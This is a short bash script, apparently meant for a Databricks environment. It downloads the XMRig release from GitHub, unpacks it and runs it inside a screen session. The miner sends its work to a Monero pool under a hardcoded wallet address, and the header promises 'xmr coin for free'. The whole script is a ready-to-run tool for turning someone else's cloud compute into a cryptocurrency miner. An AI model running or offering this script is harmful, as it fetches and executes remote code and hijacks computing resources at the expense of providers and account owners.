#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 46BuQsPCKtXUhbCWnVM4m866NB3U6BYZ5QFEBrr9rxt286kvKuypytjg2pfALciJBRjU6HpWHA3oESPioBn2uoz2TawLv8D -k --tls --rig-id aank
